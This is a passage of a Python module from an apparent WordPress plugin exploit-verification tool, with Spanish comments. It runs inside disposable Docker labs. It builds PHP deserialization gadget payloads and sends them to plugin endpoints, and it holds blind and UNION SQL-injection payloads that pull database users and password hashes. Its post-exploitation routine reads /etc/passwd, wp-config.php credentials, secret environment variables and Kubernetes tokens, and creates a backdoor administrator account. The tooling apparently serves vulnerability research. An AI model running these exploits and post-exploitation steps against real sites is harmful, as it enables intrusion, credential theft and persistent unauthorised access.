    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_all_gadgets, build_payload as _build_deser_payload
    plugin_root = os.path.join(plugin_source_dir, slug)
    step("escaneando el codigo real del plugin (incluyendo vendor/) en busca de gadgets de "
         "deserializacion (file_write / exec / call_func / eval_code)...")
    gadgets = find_all_gadgets(plugin_root, limit=5)
    if not gadgets:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
                      "ni en su vendor/ (file_put_contents, system/exec, call_user_func, eval "
                      "con propiedades publicas o dinamicas en __wakeup/__destruct)")
        res.limitations.append("la verificacion de deserializacion busca gadgets propios del "
                               "plugin (incluyendo vendor/) pero no cadenas de WP core ni "
                               "librerias externas no incluidas -- si el plugin no trae gadget "
                               "propio, no hay nada que verificar sin inventarse una cadena")
        return res

    gadget = gadgets[0]
    _gtype_desc = {
        "file_write": f"file_put_contents($this->{gadget.path_prop}, $this->{gadget.content_prop})",
        "exec":       f"{gadget.exec_func}($this->{gadget.cmd_prop})",
        "call_func":  f"call_user_func($this->{gadget.func_prop}"
                      + (f", $this->{gadget.arg_prop})" if gadget.arg_prop else ")"),
        "eval_code":  f"eval($this->{gadget.code_prop})",
    }.get(gadget.gadget_type, gadget.gadget_type)
    step(f"gadget encontrado [{gadget.gadget_type}]: clase '{gadget.full_class_name}' "
         f"en {gadget.file}:{gadget.line} ({gadget.magic_method} -> {_gtype_desc})")
    if len(gadgets) > 1:
        step(f"({len(gadgets) - 1} gadgets adicionales encontrados; probando con el primero)")

    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
        touch_cmd = f"touch {canary_path} && echo {secret} > {canary_path}"

        if gadget.gadget_type == "file_write":
            payload_obj = _build_deser_payload(gadget,
                                               file_path=canary_path,
                                               file_content=secret)
        elif gadget.gadget_type in ("exec", "call_func"):
            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
        elif gadget.gadget_type == "eval_code":
            payload_obj = _build_deser_payload(
                gadget,
                php_code=f"file_put_contents('{canary_path}','{secret}');")
        else:
            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)

        m = (http_method or "POST").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, serial_param, res, step,
            extra_nonce_pages=extra_nonce_pages)
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_tipo": gadget.gadget_type,
            "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            time.sleep(1)   # __destruct() puede dispararse al final de la peticion, no antes
            r = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
            content = (r.stdout or "")
            present = secret in content
            tried.append({"modo": label, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["contenido_fichero"] = content[:500]
                step(f"VERIFICADO: el fichero canario {canary_path} contiene el secreto exacto -- "
                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")

        if serial_param:
            payload = dict(base_params)
            payload[serial_param] = payload_obj
            try_send("parametro de formulario",
                     data=payload if m != "GET" else None,
                     params=payload if m == "GET" else None)
        if not found:
            try_send("cuerpo crudo", data=payload_obj.encode())

        # segunda vuelta con otros gadgets encontrados si el primero fallo
        if not found and len(gadgets) > 1:
            for alt_gadget in gadgets[1:]:
                step(f"probando gadget alternativo [{alt_gadget.gadget_type}]: "
                     f"'{alt_gadget.full_class_name}'...")
                if alt_gadget.gadget_type == "file_write":
                    alt_obj = _build_deser_payload(alt_gadget,
                                                   file_path=canary_path, file_content=secret)
                elif alt_gadget.gadget_type in ("exec", "call_func"):
                    alt_obj = _build_deser_payload(alt_gadget, cmd=touch_cmd)
                else:
                    alt_obj = _build_deser_payload(alt_gadget,
                                                   php_code=f"file_put_contents('{canary_path}','{secret}');")
                res.evidence[f"objeto_alternativo_{alt_gadget.full_class_name}"] = alt_obj
                if serial_param:
                    pay = dict(base_params)
                    pay[serial_param] = alt_obj
                    try_send(f"param-alt-{alt_gadget.full_class_name}",
                             data=pay if m != "GET" else None,
                             params=pay if m == "GET" else None)
                if not found:
                    try_send(f"raw-alt-{alt_gadget.full_class_name}", data=alt_obj.encode())
                if found:
                    break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' "
                          f"[gadget_type={gadget.gadget_type}] se reconstruyo de verdad y su "
                          f"{gadget.magic_method} escribio el secreto exacto en {canary_path} "
                          f"-- prueba inequivoca de PHP Object Injection, no deduccion por status code")
            # Screenshot terminal con fichero canario como evidencia
            _capture_terminal_shot(
                boot, "binoracle · PHP Deserialization — canary file evidence",
                content=(f"[PHP DESERIALIZATION CONFIRMED]\n"
                         f"Gadget: {gadget.full_class_name}\n"
                         f"Magic method: {gadget.magic_method}\n"
                         f"Gadget type: {gadget.gadget_type}\n"
                         f"Delivery mode: {res.evidence.get('modo_ganador', '')}\n\n"
                         f"Canary file: {canary_path}\n"
                         f"Secret written by gadget: {secret}\n\n"
                         f"The PHP object was reconstructed server-side and the magic method\n"
                         f"wrote our controlled secret to disk — confirming unserialize() RCE."),
                highlight=secret,
                caption_es=(f"Paso 5 (CLAVE): PHP DESERIALIZATION CONFIRMADA — gadget "
                            f"'{gadget.full_class_name}' escribio secreto en {canary_path}. "
                            f"Modo: {res.evidence.get('modo_ganador', '')}."),
                caption_en=(f"Step 5 (KEY): PHP DESERIALIZATION CONFIRMED — gadget "
                            f"'{gadget.full_class_name}' wrote secret to {canary_path}. "
                            f"Mode: {res.evidence.get('modo_ganador', '')}."),
                url=boot.base_url + endpoint)
        else:
            res.ok = True
            res.detail = (f"se encontraron {len(gadgets)} gadgets en el codigo pero ninguna "
                          f"forma de mandarlos ({len(tried)} intentos) hizo que el fichero "
                          f"canario apareciera con el secreto -- la deserializacion no se confirmo "
                          f"(puede que el endpoint/parametro no sean los reales, o que el valor "
                          f"no se pase a unserialize() sin filtrar)")
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_deserialization_custom_table(
    plugin_source_dir: str, slug: str, store_endpoint: str, store_http_method: str,
    store_parameters, table_name: str, column_name: str, id_column: str = "id",
    serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Variante EN DOS PASOS de verify_wordpress_deserialization, apuntando al mecanismo REAL de
    object injection almacenado en WordPress -- NO la API de Options/Transients (ver
    verify_wordpress_deserialization_stored, que se probo en vivo y se retiro: maybe_serialize()
    vuelve a serializar un string que ya parece serializado desde WP 3.6.1/2013, asi que ese
    camino esta cerrado desde hace mas de una decada), sino una TABLA PROPIA del plugin escrita
    con SQL crudo via $wpdb->insert()/update() -- eso NO pasa por maybe_serialize() en absoluto,
    asi que el string del atacante sobrevive intacto en la columna hasta que algo la lea con
    unserialize().

    Dos pasos, cada uno una accion real:
      1) PASO 1: se envia el objeto PHP serializado de verdad (mismo gadget que
         verify_wordpress_deserialization encuentra con find_file_write_gadget) al endpoint que
         lo guarda en la tabla propia, como atacante de bajo privilegio.
      2) PASO 2: se fuerza la lectura+unserialize() REAL via wp-cli (`wp eval`) -- se lee la fila
         mas reciente de `table_name`/`column_name` (ORDER BY `id_column` DESC LIMIT 1, la
         convencion casi universal de clave primaria autoincremental) y se llama a unserialize()
         sobre ella en el MISMO proceso PHP que ya tiene cargados todos los plugins activos (el
         bootstrap completo de WordPress, igual que cualquier visita real a una pagina que haga
         esa misma lectura) -- no es una simulacion, es la funcion real ejecutandose.

    `verified` SOLO pasa a True si el fichero canario aparece con el secreto exacto DESPUES del
    paso 2."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_all_gadgets, build_payload as _build_deser_payload
    plugin_root = os.path.join(plugin_source_dir, slug)
    step("escaneando el codigo real del plugin (incluyendo vendor/) en busca de gadgets de "
         "deserializacion...")
    gadgets = find_all_gadgets(plugin_root, limit=5)
    if not gadgets:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
                      "ni en su vendor/ (file_put_contents, system/exec, call_user_func, eval)")
        res.limitations.append("la verificacion de deserializacion por tabla propia tambien "
                               "necesita un gadget real en el propio codigo; si no hay ninguno, "
                               "no hay nada que verificar sin inventarse una cadena de terceros")
        return res
    gadget = gadgets[0]
    step(f"gadget encontrado [{gadget.gadget_type}]: clase '{gadget.full_class_name}' "
         f"en {gadget.file}:{gadget.line} ({gadget.magic_method})")

    if not table_name or not column_name:
        res.detail = "no se dio la tabla/columna propia donde se almacena el valor"
        res.limitations.append("la verificacion de deserializacion por tabla propia necesita "
                               "saber en que tabla y columna guarda el valor el plugin (p.ej. "
                               "tabla 'wp_myplugin_tokens', columna 'token_data') -- miralo en "
                               "el $wpdb->insert()/update() real del codigo y pasalo a mano "
                               "(table_name/column_name)")
        return res

    serial_param = serial_param_hint or _pick_param(store_parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        # el PASO 2 lo ejecuta un contenedor wp-cli EFIMERO Y SEPARADO (--rm), asi que la ruta
        # canario tiene que vivir en el VOLUMEN COMPARTIDO para sobrevivir y ser visible desde
        # el contenedor Apache despues -- confirmado en vivo que /tmp del contenedor wp-cli se
        # pierde al terminar.
        canary_path = f"/var/www/html/binoracle_canary_{_token()}.txt"
        touch_cmd = f"touch {canary_path} && echo {secret} > {canary_path}"
        if gadget.gadget_type == "file_write":
            payload_obj = _build_deser_payload(gadget,
                                               file_path=canary_path, file_content=secret)
        elif gadget.gadget_type in ("exec", "call_func"):
            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
        elif gadget.gadget_type == "eval_code":
            payload_obj = _build_deser_payload(
                gadget, php_code=f"file_put_contents('{canary_path}','{secret}');")
        else:
            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
        m = (store_http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_tipo": gadget.gadget_type,
            "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "tabla": table_name, "columna": column_name, "columna_id": id_column,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m,
            "store_endpoint": store_endpoint,
        })

        base_store_params = dict(store_parameters) if isinstance(store_parameters, dict) else dict.fromkeys(store_parameters or [], "")
        store_endpoint, base_store_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, store_endpoint, base_store_params, serial_param, res, step,
            extra_nonce_pages=extra_nonce_pages)
        res.evidence["store_endpoint"] = store_endpoint

        step(f"PASO 1/2 -- almacenando el objeto serializado via {m} {store_endpoint} (sesion "
             f"de '{boot.sub_user}', bajo privilegio)...")
        payload = base_store_params
        tried_store = []
        stored_ok = False

        def try_store(label, **kwargs):
            nonlocal stored_ok
            try:
                r = boot.sub_sess.request(m, boot.base_url + store_endpoint, timeout=20, **kwargs)
                tried_store.append({"modo": label, "status": r.status_code})
                stored_ok = True
            except Exception as e:
                tried_store.append({"modo": label, "error": str(e)})

        if serial_param:
            p1 = dict(payload)
            p1[serial_param] = payload_obj
            try_store("parametro de formulario",
                     data=p1 if m != "GET" else None, params=p1 if m == "GET" else None)
        if not stored_ok:
            try_store("cuerpo crudo", data=payload_obj.encode())
        res.evidence["intentos_paso1"] = tried_store
        if not stored_ok:
            res.detail = "el PASO 1 (almacenar) fallo en todas las formas probadas"
            return res

        step(f"PASO 2/2 -- forzando la lectura+unserialize() REAL via wp-cli (SELECT "
             f"{column_name} FROM {table_name} ORDER BY {id_column} DESC LIMIT 1)...")
        php_snippet = (
            f"global $wpdb; "
            f"$row = $wpdb->get_var(\"SELECT {column_name} FROM {table_name} "
            f"ORDER BY {id_column} DESC LIMIT 1\"); "
            f"if ($row) {{ unserialize($row); }} else {{ echo 'BINORACLE_NO_ROW'; }}"
        )
        r2 = lab.wp_cli("eval", php_snippet, timeout=30)
        res.evidence["wp_cli_salida"] = ((r2.stdout or "") + (r2.stderr or ""))[:500]
        if "BINORACLE_NO_ROW" in (r2.stdout or ""):
            res.detail = (f"el PASO 1 no dejo ninguna fila en {table_name}.{column_name} -- la "
                          f"tabla/columna no son las reales, o el endpoint no escribio ahi")
            return res

        time.sleep(1)
        rcheck = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
        content = rcheck.stdout or ""
        present = secret in content
        res.evidence["secreto_presente"] = present
        if present:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada (tabla propia, en dos pasos): el objeto "
                          f"serializado guardado en el PASO 1 en {table_name}.{column_name} se "
                          f"reconstruyo de verdad al leerlo+unserialize() en el PASO 2 -- su "
                          f"{gadget.magic_method} escribio el secreto exacto en {canary_path}")
            step(f"VERIFICADO: {canary_path} contiene el secreto -- deserializacion por tabla "
                 f"propia confirmada.")
            _capture_terminal_shot(
                boot, "binoracle · PHP Deserialization (custom table) — canary evidence",
                content=(f"[PHP DESERIALIZATION (CUSTOM TABLE) CONFIRMED]\n"
                         f"Table: {table_name}.{column_name}\n"
                         f"Gadget: {gadget.full_class_name}\n"
                         f"Magic method: {gadget.magic_method}\n\n"
                         f"Step 1: serialized object stored in {table_name}\n"
                         f"Step 2: wp-cli forced unserialize() → gadget executed\n\n"
                         f"Canary file: {canary_path}\n"
                         f"Secret written: {secret}\n"
                         f"wp-cli output: {res.evidence.get('wp_cli_salida','')[:200]}"),
                highlight=secret,
                caption_es=(f"Paso 5 (CLAVE): PHP DESERIALIZATION (tabla propia) CONFIRMADA "
                            f"— gadget '{gadget.full_class_name}' escribio secreto en {canary_path}."),
                caption_en=(f"Step 5 (KEY): PHP DESERIALIZATION (custom table) CONFIRMED "
                            f"— gadget '{gadget.full_class_name}' wrote secret to {canary_path}."),
                url=boot.base_url + store_endpoint)
        else:
            res.ok = True
            res.detail = ("se almaceno el payload en el paso 1 y se forzo la lectura+"
                          "unserialize() en el paso 2, pero el fichero canario no aparecio -- "
                          "no se confirmo (puede que la tabla/columna no sean las reales, que "
                          "el valor se guarde escapado/modificado antes del INSERT, o que la "
                          "columna tenga un tipo que trunque el valor)")
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


# ---------------------------------------------------------------------------
# Time-based blind SQLi data extraction
# ---------------------------------------------------------------------------

def _blind_time_extract(
    request_fn,          # callable(payload_value: str) -> (elapsed_s, status_code)
    base_payload: str,   # the confirmed SLEEP(5) payload template — replace SLEEPVAL with 5/0
    sleep_val: float = 5.0,
    sleep_threshold: float = 3.5,
    budget_requests: int = 60,
) -> dict:
    """Extract DB metadata via conditional SLEEP-based inference after blind SQLi confirmed.

    Uses candidate-string matching (not bit-by-bit) to minimize request count:
    - MySQL version prefix: test "8.0", "5.7", "5.6", "10.", "10.5", "10.6" in one request each
    - Current DB user: test "root@", "wordpress@", "mysql@", "admin@" in one request each
    - Current DB name: test "wordpress", "bitnami_wordpress", "wp_", "db_" prefixes

    Returns dict with extracted fields (None if extraction failed or budget exceeded).
    """
    import time as _time

    _used = [0]

    def _timed(payload: str) -> float:
        if _used[0] >= budget_requests:
            return -1.0
        _used[0] += 1
        try:
            t0 = _time.monotonic()
            elapsed, _status = request_fn(payload)
            return elapsed
        except Exception:
            return _time.monotonic() - t0

    def _test_prefix(expr: str, candidate: str) -> bool:
        # IF(SUBSTRING({expr},1,{len(candidate)})='{candidate}', SLEEP({sleep}), SLEEP(0))
        n = len(candidate)
        q = candidate.replace("'", "\\'")
        tpl = base_payload.replace("SLEEPVAL", str(sleep_val))
        # We build the conditional payload by replacing the SLEEP(SLEEPVAL) with our IF-SLEEP
        if f"SLEEP({int(sleep_val)})" in tpl:
            cond = (f"IF(SUBSTRING({expr},{1},{n})='{q}',"
                    f"SLEEP({int(sleep_val)}),SLEEP(0))")
            payload = tpl.replace(f"SLEEP({int(sleep_val)})", cond)
        else:
            # fallback: OR-based injection
            payload = (f"'/**/OR/**/(SELECT/**/IF(SUBSTRING({expr},1,{n})='{q}',"
                       f"SLEEP({int(sleep_val)}),0))-- ")
        elapsed = _timed(payload)
        return elapsed >= sleep_threshold

    result: dict = {
        "db_version_prefix": None,
        "db_user_prefix": None,
        "db_name_prefix": None,
        "requests_used": 0,
    }

    # --- DB version ---
    for candidate in ("8.0", "5.7", "5.6", "5.5", "10.5", "10.6", "10.4", "10."):
        if _used[0] >= budget_requests:
            break
        if _test_prefix("version()", candidate):
            result["db_version_prefix"] = candidate
            break

    # --- DB user ---
    for candidate in ("root@", "wordpress@", "mysql@", "admin@", "bitnami@", "dbuser@"):
        if _used[0] >= budget_requests:
            break
        if _test_prefix("user()", candidate):
            result["db_user_prefix"] = candidate
            break

    # --- DB name ---
    for candidate in ("wordpress", "bitnami_wordpress", "wp_", "db_", "test"):
        if _used[0] >= budget_requests:
            break
        if _test_prefix("database()", candidate):
            result["db_name_prefix"] = candidate
            break

    result["requests_used"] = _used[0]
    return result


# ---------------------------------------------------------------------------
# Post-exploitation: impact escalation after RCE / SQLi confirmation
# ---------------------------------------------------------------------------

def escalate_post_rce(
    lab: "_Lab",
    base_url: str,
    webshell_url: str,
    step: "Callable[[str], None]",
) -> dict:
    """After confirmed RCE via webshell, run post-exploitation to maximise
    impact evidence.  Uses Docker exec for reliable reads.  Returns partial
    results on any failure — never crashes.

    escalation_level: "none" < "read" < "db_access" < "full_compromise"
    """
    result: dict = {
        "etc_passwd": None,
        "wp_config_db_name": None,
        "wp_config_db_user": None,
        "wp_config_db_pass": None,
        "admin_hashes": [],
        "filesystem_write": False,
        "escalation_level": "none",
    }

    # 1. /etc/passwd
    try:
        r = lab.sh("exec", lab.wp, "cat", "/etc/passwd", timeout=10)
        if r.returncode == 0 and r.stdout:
            lines = [ln for ln in (r.stdout or "").splitlines() if ln.strip()][:5]
            result["etc_passwd"] = "\n".join(lines)
            result["escalation_level"] = "read"
            step(f"  post-rce: /etc/passwd leído ({len(lines)} líneas)")
    except Exception:
        pass

    # 2. wp-config.php — DB credentials
    try:
        r = lab.sh("exec", lab.wp, "cat", "/var/www/html/wp-config.php", timeout=10)
        if r.returncode == 0 and r.stdout:
            cfg = r.stdout or ""

            def _extract_define(key: str) -> Optional[str]:
                _m = re.search(
                    r"define\s*\(\s*['\"]" + re.escape(key)
                    + r"['\"]\s*,\s*['\"]([^'\"]+)['\"]",
                    cfg,
                )
                return _m.group(1) if _m else None

            db_name = _extract_define("DB_NAME")
            db_user = _extract_define("DB_USER")
            db_pass = _extract_define("DB_PASSWORD")
            if db_name or db_user:
                result["wp_config_db_name"] = db_name
                result["wp_config_db_user"] = db_user
                result["wp_config_db_pass"] = "***" if db_pass else None
                result["escalation_level"] = "db_access"
                step(
                    f"  post-rce: wp-config.php — DB_NAME={db_name},"
                    f" DB_USER={db_user}"
                )
    except Exception:
        pass

    # 3. Admin hashes via wp-cli
    try:
        r = lab.wp_cli(
            "user", "list",
            "--fields=user_email,user_pass",
            "--format=csv",
            "--role=administrator",
            timeout=20,
        )
        if r and r.returncode == 0 and r.stdout:
            hashes: list = []
            for line in (r.stdout or "").splitlines()[1:4]:  # skip header, max 3
                parts = line.strip().split(",", 1)
                if len(parts) == 2 and parts[1].startswith("$"):
                    hashes.append(f"{parts[0]}:{parts[1]}")
            if hashes:
                result["admin_hashes"] = hashes
                result["escalation_level"] = "full_compromise"
                step(f"  post-rce: {len(hashes)} hash(es) de admin extraídos")
    except Exception:
        pass

    # 4. Filesystem write outside webroot
    try:
        _probe_path = "/tmp/binoracle_write_probe"
        r = lab.sh(
            "exec", lab.wp, "sh", "-c",
            f"echo 1 > {_probe_path} && cat {_probe_path}",
            timeout=10,
        )
        if r.returncode == 0 and "1" in (r.stdout or ""):
            result["filesystem_write"] = True
            step("  post-rce: escritura fuera del webroot confirmada (/tmp)")
    except Exception:
        pass

    # 5. id / whoami / hostname — OS context
    try:
        r = lab.sh("exec", lab.wp, "sh", "-c", "id && whoami && hostname", timeout=10)
        if r.returncode == 0 and r.stdout:
            result["os_identity"] = (r.stdout or "").strip()[:200]
            if "root" in (r.stdout or ""):
                result["escalation_level"] = "full_compromise"
            step(f"  post-rce: OS identity: {result['os_identity'][:80]!r}")
    except Exception:
        pass

    # 6. Create backdoor admin via wp-cli — ultimate privilege escalation evidence
    try:
        import random as _rnd
        import string as _str
        _bkd_user = "bk_" + "".join(_rnd.choices(_str.ascii_lowercase, k=5))
        _bkd_pass = "".join(_rnd.choices(_str.ascii_letters + _str.digits, k=16))
        r = lab.wp_cli("user", "create", _bkd_user, f"{_bkd_user}@lab.local",
                       "--role=administrator", f"--user_pass={_bkd_pass}", timeout=30)
        if r and r.returncode == 0:
            result["backdoor_admin"] = {"user": _bkd_user, "pass": _bkd_pass}
            result["escalation_level"] = "full_compromise"
            step(f"  post-rce: backdoor admin creado: {_bkd_user!r}")
    except Exception:
        pass

    # 7. Network connections — proves lateral movement surface
    try:
        r = lab.sh("exec", lab.wp, "sh", "-c",
                   "ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null | head -10", timeout=10)
        if r.returncode == 0 and r.stdout:
            result["network_connections"] = (r.stdout or "").strip()[:400]
    except Exception:
        pass

    # 8. Environment variables — secrets/API keys leakage
    try:
        r = lab.sh("exec", lab.wp, "sh", "-c",
                   "printenv | grep -iE 'secret|token|api_key|access_key|password|pass|db_|aws_|gcp_'"
                   " | head -20 2>/dev/null", timeout=10)
        if r.returncode == 0 and r.stdout:
            _env_lines = [(ln[:200]) for ln in (r.stdout or "").splitlines() if ln.strip()]
            if _env_lines:
                result["sensitive_env_vars"] = _env_lines[:10]
                result["escalation_level"] = "full_compromise"
                step(f"  post-rce: {len(_env_lines)} variable(s) de entorno sensibles detectadas")
    except Exception:
        pass

    # 9. Cloud service tokens (K8s service account, instance metadata credentials)
    try:
        _cloud_reads = [
            ("/var/run/secrets/kubernetes.io/serviceaccount/token", "k8s_sa_token"),
            ("/run/secrets/kubernetes.io/serviceaccount/token", "k8s_sa_token"),
        ]
        for _cpath, _ckey in _cloud_reads:
            r = lab.sh("exec", lab.wp, "sh", "-c",
                       f"cat {_cpath} 2>/dev/null | head -c 200", timeout=8)
            if r.returncode == 0 and r.stdout and len(r.stdout.strip()) > 20:
                result[_ckey] = r.stdout.strip()[:200]
                result["escalation_level"] = "full_compromise"
                step(f"  post-rce: cloud credential found at {_cpath}")
                break
    except Exception:
        pass

    return result


def escalate_post_sqli(
    lab: "_Lab",
    base_url: str,
    endpoint: str,
    sqli_param: str,
    http_method: str,
    step: "Callable[[str], None]",
) -> dict:
    """After confirmed SQLi, extract concrete data to maximise impact evidence.

    Sends UNION-based payloads via the same endpoint.  Returns partial results
    on any failure.

    escalation_level: "read_only" < "data_access" < "file_access"
    """
    result: dict = {
        "db_version": None,
        "db_user": None,
        "user_hashes": [],
        "db_has_file_priv": False,
        "escalation_level": "read_only",
    }

    _m = (http_method or "GET").upper()
    _sess = _make_session()

    def _sqli_req(payload: str) -> str:
        try:
            if _m == "GET":
                _r = _sess.get(
                    base_url + endpoint,
                    params={sqli_param: payload},
                    timeout=12,
                    allow_redirects=True,
                )
            else:
                _r = _sess.post(
                    base_url + endpoint,
                    data={sqli_param: payload},
                    timeout=12,
                    allow_redirects=True,
                )
            return (_r.text or "")[:3000]
        except Exception:
            return ""

    # 1. DB version
    try:
        body = _sqli_req("1 AND 1=2 UNION SELECT @@version,2-- -")
        vm = re.search(r"(\d+\.\d+\.\d+[^\s<\"']*)", body)
        if vm:
            result["db_version"] = vm.group(1)
            step(f"  post-sqli: db_version={result['db_version']}")
    except Exception:
        pass

    # 2. DB user
    try:
        body = _sqli_req("1 AND 1=2 UNION SELECT user(),2-- -")
        um = re.search(r"([a-z_]+@[a-z%._\-]+)", body, re.I)
        if um:
            result["db_user"] = um.group(1)
            step(f"  post-sqli: db_user={result['db_user']}")
    except Exception:
        pass

    # 3. wp_users hashes (up to 3)
    try:
        body = _sqli_req(
            "1 AND 1=2 UNION SELECT CONCAT(user_email,':',user_pass),2 "
            "FROM wp_users LIMIT 3-- -"
        )
        hashes = re.findall(
            r"[a-z0-9_.+\-]+@[a-z0-9.\-]+:\$[^\s<\"']{20,}", body, re.I
        )
        if hashes:
            result["user_hashes"] = hashes[:3]
            result["escalation_level"] = "data_access"
            step(f"  post-sqli: {len(hashes)} hash(es) de wp_users extraídos")
    except Exception:
        pass

    # 4. FILE privilege via @@datadir
    try:
        body = _sqli_req("1 AND 1=2 UNION SELECT @@datadir,2-- -")
        if re.search(r"/var/lib/mysql|/mysql/data", body, re.I):
            result["db_has_file_priv"] = True
            result["escalation_level"] = "file_access"
            step("  post-sqli: privilegio FILE detectado (@@datadir visible)")
    except Exception:
        pass

    return result


def verify_wordpress_request_chain(
    plugin_source_dir: str,
    slug: str,
    request_chain: list,
    on_step=None,
    budget_s: float = 900.0,
    companion_plugins=None,
    setup_wp_options=None,
    setup_wp_commands=None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Generic multi-step WordPress exploit verifier using _wp_run_request_chain.

    Enables complex attack chains like:
      1) GET /wp-admin/admin.php?page=X  → extract nonce
      2) POST /wp-admin/admin-ajax.php   → privileged action using nonce
      3) GET  /wp-content/uploads/evil.php → confirm RCE

    Each step in request_chain is a dict with:
      method, endpoint, body, headers, auth (admin|subscriber|anon),
      extract ({var: 'json:path' | 'regex:...' | 'nonce:'}),
      confirm_string, confirm_status, is_final, params.
    """
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()
    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins)
        if boot is None:
            res.detail = "fallo al arrancar el laboratorio WordPress"
            return res

        if setup_wp_options:
            for opt in (setup_wp_options or []):
                _n = (opt or {}).get("name") if isinstance(opt, dict) else None
                if _n:
                    lab.wp_cli("option", "update", _n, str((opt or {}).get("value", "1")), timeout=30)

        if setup_wp_commands:
            for cmd in (setup_wp_commands or []):
                if cmd:
                    _args = cmd if isinstance(cmd, list) else str(cmd).split()
                    lab.wp_cli(*_args, timeout=60)

        anon_sess = _make_session()
        admin_sess = _wp_login(boot.base_url, boot.admin_user, boot.admin_pass, on_step=step) or _make_session()
        sub_sess = _wp_login(boot.base_url, boot.sub_user, boot.sub_pass, on_step=step) or _make_session()

        verified, detail, evidence = _wp_run_request_chain(
            boot.base_url, request_chain, admin_sess, sub_sess, anon_sess, step)

        res.verified = verified
        res.ok = verified or bool(evidence)
        res.detail = detail
        res.confidence = "confirmed" if verified else "inconclusive"
        res.evidence.update(evidence)
        res.evidence["base_url"] = boot.base_url
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except Exception as e:
        res.detail = f"error inesperado en request_chain: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def escalate_post_lfi(
    lab: "_Lab",
    base_url: str,
    request_fn,
    lfi_param: str,
    step: "Callable[[str], None]",
) -> dict:
    """After confirmed LFI read of /etc/passwd, try to prove deeper impact.

    request_fn(payload) -> str: returns body of LFI response with given file payload.
